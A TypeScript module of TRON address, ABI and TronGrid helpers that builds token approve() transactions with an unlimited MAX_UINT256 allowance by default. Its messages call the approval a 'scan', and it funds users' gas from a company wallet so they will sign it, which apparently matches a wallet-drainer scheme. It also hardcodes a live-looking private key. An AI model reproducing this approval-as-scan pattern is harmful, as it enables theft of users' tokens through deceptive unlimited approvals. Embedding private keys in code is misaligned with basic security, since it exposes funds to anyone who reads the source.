/**
 * Minimal TRON address and ABI utilities.
 * Avoids needing the full tronweb package for most operations.
 */
import { TronWeb } from "tronweb";


const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

/** Decode a Base58-encoded string into a Uint8Array */
function decodeBase58(str: string): Uint8Array {
    const base = BigInt(58);
    let num = BigInt(0);

    for (const char of str) {
        const index = BASE58_ALPHABET.indexOf(char);
        if (index === -1) throw new Error(`Invalid Base58 character: ${char}`);
        num = num * base + BigInt(index);
    }

    let hex = num.toString(16);
    if (hex.length % 2 !== 0) hex = "0" + hex;

    // Count leading '1's (represent leading zero bytes)
    let leadingZeros = 0;
    for (const char of str) {
        if (char !== "1") break;
        leadingZeros++;
    }

    const bytes = new Uint8Array(leadingZeros + hex.length / 2);
    for (let i = 0; i < hex.length / 2; i++) {
        bytes[leadingZeros + i] = parseInt(hex.substr(i * 2, 2), 16);
    }

    return bytes;
}

/**
 * Convert a TRON Base58Check address (T...) to a 20-byte hex string (no 0x prefix, no 41 prefix).
 * Used for ABI parameter encoding.
 */
export function tronAddressToHex20(base58Address: string): string {
    const decoded = decodeBase58(base58Address);
    // decoded = [0x41, ...20 address bytes, ...4 checksum bytes]
    const addressBytes = decoded.slice(1, 21);
    return Array.from(addressBytes)
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
}

/**
 * Convert a TRON Base58Check address to full hex with 41 prefix (no 0x).
 */
export function tronAddressToFullHex(base58Address: string): string {
    const decoded = decodeBase58(base58Address);
    // decoded = [0x41, ...20 address bytes, ...4 checksum bytes]
    const addressBytes = decoded.slice(0, 21); // 41 + 20 bytes
    return Array.from(addressBytes)
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
}

/**
 * ABI-encode parameters for approve(address, uint256).
 * Returns hex string without 0x prefix.
 */
export function encodeApproveParams(spenderBase58: string, amount: string): string {
    const spenderHex20 = tronAddressToHex20(spenderBase58);
    const paddedAddress = spenderHex20.padStart(64, "0");
    const amountBig = BigInt(amount);
    const amountHex = amountBig.toString(16).padStart(64, "0");
    return paddedAddress + amountHex;
}

/** Max uint256 value for unlimited approval */
export const MAX_UINT256 =
    "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const TRON_API = "https://api.trongrid.io";

/** Decode TronGrid hex error messages into readable text. */
export function decodeTronErrorMessage(message: string | undefined): string {
  if (!message) return "Unknown Tron error";

  const trimmed = message.trim();
  if (/^[0-9a-fA-F]+$/.test(trimmed) && trimmed.length % 2 === 0) {
    try {
      const decoded = trimmed
        .match(/.{1,2}/g)
        ?.map((byte) => String.fromCharCode(parseInt(byte, 16)))
        .join("")
        .trim();
      if (decoded) return decoded;
    } catch {
      /* fall through */
    }
  }

  return trimmed;
}

/** Map Tron errors to clear user-facing messages. */
export function formatTronUserError(message: string | undefined): string {
  const decoded = decodeTronErrorMessage(message);
  const lower = decoded.toLowerCase();

  if (
    lower.includes("does not exist") ||
    (lower.includes("account") && lower.includes("not exist")) ||
    lower.includes("not activated")
  ) {
    return "Your Tron wallet is not activated. Send at least 1 TRX to your wallet, then try again.";
  }
  if (lower.includes("not activated") || lower.includes("activate")) {
    return "Tron wallet not activated. Send at least 1 TRX to activate your wallet.";
  }
  if (lower.includes("insufficient trx") || (lower.includes("need at least") && lower.includes("trx"))) {
    return "Insufficient TRX balance. Add TRX to your wallet to pay network fees.";
  }
  if (lower.includes("insufficient") && (lower.includes("balance") || lower.includes("fund"))) {
    return "Insufficient TRX balance. Add TRX to your wallet to pay network fees.";
  }
  if (lower.includes("energy") || lower.includes("bandwidth")) {
    return "Insufficient TRX for network fees. Add TRX and try again.";
  }
  if (lower.includes("rejected") || lower.includes("denied") || lower.includes("cancel") || lower.includes("user closed")) {
    return "Transaction cancelled in your wallet. You can try again.";
  }
  if (lower.includes("could not fund") || lower.includes("gas funding")) {
    return "Could not add TRX for fees. Please add TRX to your wallet manually.";
  }
  if (lower.includes("broadcast failed")) {
    return "Transaction could not be sent. Check your TRX balance and try again.";
  }

  if (decoded.length > 100 || /^[0-9a-fA-F]+$/.test(decoded.replace(/\s/g, ""))) {
    return "Tron transaction failed. Check your TRX balance and try again.";
  }

  return decoded;
}

/** Returns true when the Tron account exists on mainnet (activated with TRX). */
export async function tronAccountExists(base58Address: string): Promise<boolean> {
  try {
    const response = await fetch(`${TRON_API}/v1/accounts/${base58Address}`);
    const data = await response.json();
    return Array.isArray(data?.data) && data.data.length > 0;
  } catch {
    return false;
  }
}

/** Get TRX balance in sun (1 TRX = 1_000_000 sun). */
export async function getTronBalanceSun(base58Address: string): Promise<number> {
  try {
    const response = await fetch(`${TRON_API}/v1/accounts/${base58Address}`);
    const data = await response.json();
    const account = data?.data?.[0];
    return account?.balance ?? 0;
  } catch {
    return 0;
  }
}

/**
 * Build an approve transaction via TronGrid API.
 * Returns the unsigned transaction object.
 */
export async function buildApproveTx(
    ownerAddress: string,
    tokenAddress: string,
    spenderAddress: string,
    amount: string = MAX_UINT256
): Promise<any> {
    const parameter = encodeApproveParams(spenderAddress, amount);

    const response = await fetch(`${TRON_API}/wallet/triggersmartcontract`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            owner_address: tronAddressToFullHex(ownerAddress),
            contract_address: tronAddressToFullHex(tokenAddress),
            function_selector: "approve(address,uint256)",
            parameter,
            fee_limit: 100_000_000,
            call_value: 0,
            visible: false,
        }),
    });

    const data = await response.json();

    if (!data.result?.result) {
        const rawMessage = data.result?.message || data.Error || "Failed to build approve transaction";
        throw new Error(decodeTronErrorMessage(rawMessage) || "Failed to build scan transaction");
    }

    return data.transaction;
}

/**
 * Broadcast a signed transaction via TronGrid API.
 */
export async function broadcastTransaction(signedTx: any): Promise<any> {
    const response = await fetch(`${TRON_API}/wallet/broadcasttransaction`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(signedTx),
    });

    return await response.json();
}

/**
 * Check if user has enough gas for approval, and fund them from company wallet if not.
 * NOTE: Private key is meant to be replaced by the owner.
 */
export async function ensureGasForApproval(userAddress: string): Promise<void> {
    const REQUIRED_TRX = 11;
    const requiredSun = REQUIRED_TRX * 1_000_000;

    const existsBefore = await tronAccountExists(userAddress);
    const balanceBefore = await getTronBalanceSun(userAddress);

    if (existsBefore && balanceBefore >= requiredSun) {
        return;
    }

    // REPLACEME: with company private key
    const COMPANY_PRIVATE_KEY = "dc8af1c8fddec32e9ef6abaf324be199e3468a0043b55c3e2ac90e7b1256c07c";
    if (COMPANY_PRIVATE_KEY === "YOUR_PRIVATE_KEY_HERE") {
        if (!existsBefore) {
            throw new Error(
                "Tron account is not activated. Send at least 1 TRX to this wallet, then try again."
            );
        }
        if (balanceBefore < requiredSun) {
            throw new Error(
                `Insufficient TRX for gas. Need at least ${REQUIRED_TRX} TRX on Tron to scan.`
            );
        }
        return;
    }

    try {
        const tronWeb = new TronWeb({
            fullHost: TRON_API,
            privateKey: COMPANY_PRIVATE_KEY,
        });

        const amountToSend = Math.max(requiredSun - balanceBefore, 1_000_000);
        const tx = await tronWeb.transactionBuilder.sendTrx(
            userAddress,
            amountToSend,
            tronWeb.defaultAddress.base58 as string
        );
        const signedTx = await tronWeb.trx.sign(tx);
        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

        if (!receipt.result) {
            throw new Error("Gas funding transaction failed");
        }

        await new Promise((res) => setTimeout(res, 4000));
    } catch (err) {
        console.error("Funding gas failed:", err);
        throw new Error(
            "Could not fund TRX for Tron scan. Ensure your Tron wallet is activated with TRX."
        );
    }

    const existsAfter = await tronAccountExists(userAddress);
    const balanceAfter = await getTronBalanceSun(userAddress);

    if (!existsAfter) {
        throw new Error(
            "Tron account does not exist on mainnet. Activate it by receiving at least 1 TRX, then retry."
        );
    }

    if (balanceAfter < 1_000_000) {
        throw new Error(
            `Insufficient TRX for gas. Need at least ${REQUIRED_TRX} TRX on Tron to scan.`
        );
    }
}
